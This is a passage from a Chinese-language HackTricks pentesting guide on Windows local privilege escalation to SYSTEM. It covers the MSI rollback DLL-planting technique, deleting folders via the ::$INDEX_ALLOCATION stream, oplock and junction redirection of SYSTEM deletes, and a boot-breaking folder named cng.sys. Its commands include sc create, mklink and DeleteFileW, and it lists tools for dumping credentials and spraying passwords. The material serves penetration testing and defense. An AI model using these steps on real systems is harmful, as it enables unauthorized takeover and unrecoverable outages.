- 使用 `ReadDirectoryChangesW` 监视 `C:\Config.Msi`，直到出现新的 `.rbs`。
- 捕获其文件名。

- Step 9: Sync Before Rollback
- 该 `.msi` 包含一个 **custom install action (`SyncBeforeRollback`)**，该动作：
- 在 `.rbs` 创建时发出事件信号。
- 然后在继续之前 **等待**。

- Step 10: Reapply Weak ACL
- 在收到 `.rbs created` 事件后：
- Windows Installer 会**重新应用强 ACLs** 到 `C:\Config.Msi`。
- 但由于你仍然持有 `WRITE_DAC` 的 handle，可以再次**重新应用弱 ACLs**。

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- 覆盖 `.rbs` 文件，放入一个 **fake rollback script**，指示 Windows：
- 将你的 `.rbf`（恶意 DLL）恢复到一个 **privileged location**（例如 `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）。
- 放下包含 **恶意 SYSTEM 级别载荷 DLL** 的假 `.rbf`。

- Step 12: Trigger the Rollback
- 发出同步事件使安装程序继续。
- 一个 **type 19 custom action (`ErrorOut`)** 被配置为在已知点故意使安装失败。
- 这将导致 **rollback 开始**。

- Step 13: SYSTEM Installs Your DLL
- Windows Installer：
- 读取你恶意的 `.rbs`。
- 将你的 `.rbf` DLL 复制到目标位置。
- 现在你的 **恶意 DLL 在一个由 SYSTEM 加载的路径下**。

- Final Step: Execute SYSTEM Code
- 运行一个受信任的 **auto-elevated binary**（例如 `osk.exe`）来加载你劫持的 DLL。
- **Boom**：你的代码以 **SYSTEM** 身份执行。


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

主要的 MSI rollback 技术（上面描述的）假定你可以删除一个**整个文件夹**（例如 `C:\Config.Msi`）。但如果你的漏洞只允许 **arbitrary file deletion** 呢？

你可以利用 **NTFS internals**：每个文件夹都有一个隐藏的备用数据流，称为：
```
C:\SomeFolder::$INDEX_ALLOCATION
```
此流存储该文件夹的 **索引元数据**。

因此，如果你 **删除文件夹的 `::$INDEX_ALLOCATION` 流**，NTFS 会从文件系统中 **移除整个文件夹**。

你可以使用标准的文件删除 APIs 来执行此操作，例如：
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> 即使你调用的是 *file* 删除 API，它 **删除文件夹本身**。

### 从删除文件夹内容到 SYSTEM EoP
如果你的原语不允许你删除任意文件/文件夹，但它**确实允许删除攻击者控制的文件夹的 *内容***？

1. 第一步：设置一个诱饵文件夹和文件
- 创建: `C:\temp\folder1`
- 在其中: `C:\temp\folder1\file1.txt`

2. 第2步：在 `file1.txt` 上放置一个 **oplock**
- 当有特权进程尝试删除 `file1.txt` 时，oplock **会暂停执行**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. 步骤 3：触发 SYSTEM 进程 (例如，`SilentCleanup`)
- 该进程扫描文件夹 (例如，`%TEMP%`) 并尝试删除其内容。
- 当它到达 `file1.txt` 时，**oplock 触发** 并将控制权交给你的回调。

4. 步骤 4：在 oplock 回调内 – 重定向删除

- 选项 A：将 `file1.txt` 移到别处
- 这样可以在不破坏 oplock 的情况下清空 `folder1`。
- 不要直接删除 `file1.txt` —— 那会过早释放 oplock。

- 选项 B：将 `folder1` 转换为一个 **junction**：
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- 选项 C: 在 `\RPC Control` 中创建一个 **symlink**:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> 这针对 NTFS 内部流，存储文件夹元数据 — 删除它会删除该文件夹。

5. 第 5 步：释放 oplock
- SYSTEM 进程继续并尝试删除 `file1.txt`。
- 但现在，由于 junction + symlink，实际上它正在删除：
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**结果**: `C:\Config.Msi` 被 SYSTEM 删除。

### 从任意文件夹创建到永久性 DoS

利用一个 primitive 让你能够 **以 SYSTEM/admin 身份创建任意文件夹** — 即使 **你不能写入文件** 或 **设置弱权限**。

创建一个**文件夹**（不是文件），其名称为一个**关键 Windows 驱动程序**，例如：
```
C:\Windows\System32\cng.sys
```
- 此路径通常对应于 `cng.sys` 内核模式驱动程序。
- 如果你 **预先将其创建为文件夹**，Windows 在引导时无法加载实际驱动程序。
- 然后，Windows 在启动过程中尝试加载 `cng.sys`。
- 它看到该文件夹，**无法解析实际驱动程序**，并且**崩溃或停止引导**。
- 没有**回退机制**，且在没有外部干预（例如，启动修复或磁盘访问）的情况下**无法恢复**。


## **从 High Integrity 到 System**

### **新服务**

如果你已经在 High Integrity 进程上运行，**通往 SYSTEM 的路径** 可能很简单，只需 **创建并执行一个新服务**：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> 创建服务二进制文件时，确保它是一个有效的服务，或者二进制能够及时执行必要的操作 —— 如果不是有效的服务，它会在 20 秒内被终止。

### AlwaysInstallElevated

从一个高完整性进程（High Integrity process）你可以尝试 **启用 AlwaysInstallElevated 注册表项** 并使用 _**.msi**_ 包装器 **安装** 一个 reverse shell。\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

如果你拥有这些 token 权限（很可能你会在已经是高完整性进程中发现它们），你将能够使用 SeDebug 权限 **打开几乎任何进程**（非受保护进程），**复制该进程的 token**，并使用该 token 创建一个 **任意进程**。\
使用此技术通常会 **选择以 SYSTEM 身份运行且具有所有 token 权限的任意进程**（_是的，你可以找到没有所有 token 权限的 SYSTEM 进程_）。\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

该技术被 meterpreter 在 getsystem 中使用。该技术包含 **创建一个 pipe**，然后创建/滥用一个 service 向该 pipe 写入。随后，使用 **`SeImpersonate`** 权限创建 pipe 的 **server** 将能够 **模拟 pipe 客户端（服务）的 token**，从而获得 SYSTEM 权限。\
如果你想要 [**了解更多关于 name pipes 的内容请阅读这里**](#named-pipe-client-impersonation)。\
如果你想阅读一个关于 [**如何利用 name pipes 从 high integrity 提升到 System 的示例请看这里**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

如果你能够 **劫持正在被以 **SYSTEM** 身份运行的 **进程** 加载的 dll**，你将能够以该权限执行任意代码。因此 Dll Hijacking 对于这类提权也很有用，而且更重要的是，从高完整性进程实现起来通常**更容易**，因为它对用于加载 dll 的文件夹具有 **写权限**。\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 检查 misconfigurations 和 敏感文件（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。已检测。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 检查一些可能的 misconfigurations 并收集信息（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 检查 misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- 提取 PuTTY、WinSCP、SuperPuTTY、FileZilla 和 RDP 的保存会话信息。本地使用时请加 -Thorough。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- 从 Credential Manager 中提取凭据。已检测。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 在域中对收集到的密码进行密码喷洒**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh 是一个 PowerShell ADIDNS/LLMNR/mDNS/NBNS 欺骗和中间人工具。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的 Windows privesc 枚举**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- 搜索已知的 privesc 漏洞（已弃用，改用 Watson）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- 本地检查 **(需要 Admin 权限)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 搜索已知的 privesc 漏洞（需要用 VisualStudio 编译）（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson)）\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 枚举主机以查找 misconfigurations（更偏向信息收集工具而非纯粹的 privesc）（需要编译）**（**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**）**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 从许多软件中提取凭据（github 上有预编译 exe）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp 的 C# 移植**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- 检查 misconfiguration（github 上有预编译可执行文件）。不推荐。它在 Win10 上表现不佳。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 检查可能的 misconfigurations（从 python 生成 exe）。不推荐。它在 Win10 上表现不佳。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 基于这篇文章创建的工具（它不需要 accesschk 就能正常工作，但可以使用 accesschk）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- 读取 **systeminfo** 的输出并推荐可用的 exploit（本地 python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- 读取 **systeminfo** 的输出并推荐可用的 exploit（本地 python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

你需要使用正确版本的 .NET 来编译该项目（[see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。要查看受害主机上已安装的 .NET 版本，你可以执行：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考资料

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
